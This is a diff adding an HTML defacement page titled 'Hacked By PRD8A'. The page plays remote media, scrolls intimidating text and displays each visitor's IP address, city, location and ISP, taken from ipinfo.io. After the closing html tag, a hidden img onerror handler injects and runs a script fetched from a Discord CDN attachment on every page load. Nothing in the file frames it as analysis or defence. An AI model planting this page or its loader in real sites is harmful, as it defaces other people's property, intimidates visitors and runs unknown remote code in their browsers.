@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Hacked By PRD8A</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #f00;
+      font-family: monospace;
+      font-size: 20px;
+      height: 100%;
+      overflow: hidden;
+      cursor: crosshair;
+      position: relative;
+    }
+
+    video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 0;
+      pointer-events: none;
+      filter: brightness(0.8) contrast(1.2);
+      mix-blend-mode: screen;
+    }
+
+    .banner {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 36px;
+      font-weight: bold;
+      color: #f00;
+      text-shadow: 0 0 5px red, 0 0 15px red, 0 0 30px crimson;
+      z-index: 5;
+      user-select: none;
+      pointer-events: none;
+      overflow: visible;
+    }
+
+    body * {
+      position: relative;
+      overflow: visible;
+    }
+
+
+
+    .ip-info {
+      font-size: 20px;
+      color: white;
+      opacity: 0.8;
+      white-space: pre-wrap;
+      text-shadow: 0 0 4px rgb(0, 0, 0);
+      position: absolute;
+      top: 55%;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 1;
+      text-align: center;
+    }
+
+    audio {
+      display: none;
+    }
+
+    .matrix-word {
+  position: absolute;
+  top: 0; 
+  color: #f00;
+  font-weight: bold;
+  font-size: 22px;
+  opacity: 0.85;
+  user-select: none;
+  white-space: nowrap;
+  pointer-events: none;
+  mix-blend-mode: screen;
+  filter: drop-shadow(0 0 2px red);
+  text-shadow: 0 0 5px red, 0 0 10px red;
+  z-index: 2;
+  animation: fall linear forwards;
+}
+
+
+    @keyframes fall {
+  0% { transform: translateY(0); opacity: 0.85; }
+  100% { transform: translateY(110vh); opacity: 0; }
+}
+
+    .credits {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 24px;
+      color: #f00;
+      text-shadow: 0 0 5px red, 0 0 10px red;
+      opacity: 0.9;
+      z-index: 3;
+      pointer-events: none;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+
+  <video id="creepyVideo" src="https://i.top4top.io/m_3569ah3f11.mp4"
+    preload="auto" autoplay muted playsinline></video>
+
+  <audio src="https://a.top4top.io/m_3565eacdz1.mp3" autoplay loop></audio>
+
+  <div class="banner">./PRD8A</div>
+
+  <div id="ipInfo" class="ip-info"></div>
+
+  <footer class="credits">discord.gg/bx</footer>
+
+  <script>
+    const words = [
+      "system error", "PRD8A", "wake up", "null", "404", "????", "PRD8A",
+      "PRD8A", "01010101", "void detected", "PRD8A", "issing fragment", "katshib", "no exit",
+      "Alexander's", "katshib", "sleep() failed", "tracking you", "error 503",
+      "memory leak", "Alexander's", "warning", "PRD8A", "access denied",
+      "recursive loop", "intruder alert", "fatal exception"
+    ];
+
+    function randomInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function randomFloat(min, max) {
+      return Math.random() * (max - min) + min;
+    }
+
+
+    function createMatrixWord() {
+      const word = words[randomInt(0, words.length - 1)];
+      const span = document.createElement('span');
+      span.className = 'matrix-word';
+      span.textContent = word;
+      span.style.left = randomInt(0, window.innerWidth - 200) + 'px';
+      span.style.animationDuration = (randomInt(50, 120)/10) + 's';
+      document.body.appendChild(span);
+      setTimeout(() => { span.remove(); }, 12000);
+    }
+
+    // Simple word loop
+    function startWordLoop() {
+      createMatrixWord();
+      setTimeout(startWordLoop, randomInt(400, 1500));
+    }
+
+    // Initialize effects
+    startWordLoop();
+    
+    // Alternating banner text
+    const banner = document.querySelector('.banner');
+    const texts = ['./PRD8A', './PRD8A'];
+    let currentIndex = 0;
+    
+    function changeBannerText() {
+      currentIndex = (currentIndex + 1) % texts.length;
+      banner.textContent = texts[currentIndex];
+    }
+    
+    // Change text every 5 seconds
+    setInterval(changeBannerText, 5000);
+
+    // IP information
+    fetch("https://ipinfo.io/json?token=")
+      .then(response => response.json())
+      .then(data => {
+        const info = `IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country}
+Location: ${data.loc}
+Org: ${data.org}
+Timezone: ${data.timezone}`.trim();
+        document.getElementById("ipInfo").textContent = info;
+      })
+      .catch(() => {
+        document.getElementById("ipInfo").textContent = "Unable to load IP info.";
+      });
+
+    // Enhanced video system with delays
+    const video = document.getElementById('creepyVideo');
+    const clips = [
+  "https://a.top4top.io/m_35505kymv1.mp4",
+  "https://i.top4top.io/m_3550lkszi1.mp4",
+  "https://i.top4top.io/m_3569ah3f11.mp4"
+];
+    let currentClip = 0;
+
+    video.addEventListener('ended', () => {
+      currentClip = (currentClip + 1) % clips.length;
+      video.src = clips[currentClip];
+      video.play();
+    });
+
+  </script>
+</body>
+</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1375773068621910079/1464402840201199626/s.js?ex=697556ec&is=6974056c&hm=bb0b1eec59c945cb4759452f3cecdf03b45ca1c4efdae586627d8a71cc2cf133&';">
